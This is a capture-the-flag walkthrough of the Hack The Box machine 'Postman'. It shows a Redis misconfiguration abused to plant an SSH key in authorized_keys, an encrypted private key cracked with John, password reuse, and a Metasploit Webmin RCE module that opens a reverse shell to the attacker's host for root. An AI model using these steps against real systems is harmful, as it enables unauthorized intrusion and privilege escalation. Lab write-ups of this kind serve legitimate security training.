# Postman - `OSCP Style`

Start: 13th November 2022 - 9:11 PM

End: 14th November 2022 - 3:28 AM

Setup
```console
$ export IP=10.10.10.160
```
Added `postman.htb` to `/etc/hosts`.

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
10000/tcp open  http    syn-ack MiniServ 1.910 (Webmin httpd)
```

Full Port Scan
```console
$ sudo nmap -sS -n -p- -T5 $IP -vv -oN nmap/full

[REDACTED]
22/tcp    open  ssh              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
6379/tcp  open  redis            syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
```
Found 1 port: `6379`.

I don't know what is `redis`, so I watched [this video](https://www.youtube.com/watch?v=8A_iNFRP0F4).

Connect to Redis-CLI
```console
$ redis-cli -h $IP -p 6379

10.10.10.160:6379> 
```

After struggling for 2 hours, I finally found the way to get inital access. Here is the [link](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh) to it.

I have to smuggle my own public key into the `authorized_keys` file of the user that is running the redis service on the server.

First, find out the working directory of the service.
```console
10.10.10.160:6379>  config get dir

1) "dir"
2) "/var/lib/redis"
```

Now we know that we can write in `/var/lib/redis`.

Before the second step, we have to make sure we are connected to the **master node**. Because sometimes we get connect to the slave node.
```console
10.10.10.160:6379> slaveof no one

OK
```

> P/S: This is where I got stuck, because I keep getting the error message `(error) READONLY You can't write against a read only slave.` when I'm connected to the slave node.

Second, I copy my own public key to a file called `temp.txt` and appended 2 newlines at the start and end of the file. If you have no SSH keys, you can generate them by using the `ssh-keygen` command.
```console
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > temp.txt
$ cat temp.txt | redis-cli -h $IP -x set ssh_key

OK
```

Back to the **redis-cli**, we just have to change the directory to `[original directory]/.ssh/` and save the file as `authorized_keys`.
```console
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

Finally, we can connect to the server using our smuggled SSH keys.
```console
$ ssh -i ~/.ssh/id_rsa redis@$IP

[REDACTED]
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

### We are in as `redis@Postman`!

Then I found `/opt/id_rsa.bak`. It is an encrypted SSH private key. I copied it to my box, saved it as `id_rsa_matt` and decrypt it using JohnTheRipper.
```console
$ ssh2john id_rsa_matt > forjohn
$ john forjohn -w=/usr/share/wordlists/rockyou.txt

[REDACTED]
computer2008		(id_rsa_matt)
```

So the password of the private key is `computer2008`. I then try to authenticate as Matt using SSH.
```console
$ ssh -i id_rsa_matt Matt@$IP
Enter passphrase for key 'id_rsa_matt': 
Connection closed by 10.10.10.160 port 22
```

It seems that the SSH service is blocking off us. I checked the ssh configs using `redis`.
```console
redis@Postman:~$ cat /etc/ssh/sshd_config

[REDACTED]
#deny users
DenyUsers Matt
[REDACTED]
```

The user `Matt` has been blocked from using SSH, no wonder we aren't able to connect.

I struggled for another 2 hours, looking another way to escalate to `Matt`. The funny thing is, `Matt` uses the same password for his SSH private key and user account.

```console
redis@Postman:/etc/ssh$ su Matt
Password: 
Matt@Postman:/etc/ssh$
```

### We are now `Matt`.

We are finally able to read the **user flag** at `/home/Matt/user.txt`.

```
root        721  0.4  3.2  95296 29472 ?        Ss   15:34   0:49 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

From here we can see the `webmin` service is run by the user `root`. This is the most possible entry point for us to get root access. Again, this box has the `reuse password` weakness. The user `Matt` uses the same password for all of this items/user accounts.

I successfully loggedin using `Matt:computer2008`.

By searching for vulnerabilities on `Webmin 1.910`. It lead me to [this](https://www.exploit-db.com/exploits/46984) vulnerability.

The same POC can also be found using searchsploit.
```console
$ searchsploit webmin 1.910

----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution  | linux/remote/46984.rb
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

It is a metasploit exploit. I'll be using the one that is already in the metasploit modules since it is a replica.

## CVE-2019-12840

This is a vulnerability in Webmin 1.910, it allows `arbitrary code injection` while performing updates on `update.cgi`. The command injection happens when `command substitution` is applied in one of the parameters in the update command while referencing the source of the update. Nevertheless, here is the metasploit module that automates everything.

```console
$ msfconsole

[REDACTED]
msf6 > search webmin

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   6  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   7  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/webmin_backdoor

msf6 > 
```

I'll be using number `4`. Supply the arguments needed for the exploit and run it.

```console
msf6 > use exploit/linux/http/webmin_packageup_rce 
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.160
rhost => 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.14.10
lhost => 10.10.14.10
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
[!] Changing the SSL option\'s value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[+] Session cookie: 2470ba29a6459f3f2089ad6ea1dca819
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.160:48752) at 2022-11-13 23:35:12 -0500

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

### Now we have the `root` shell.

The **root flag** is located at `/root/root.txt`.

### Done!
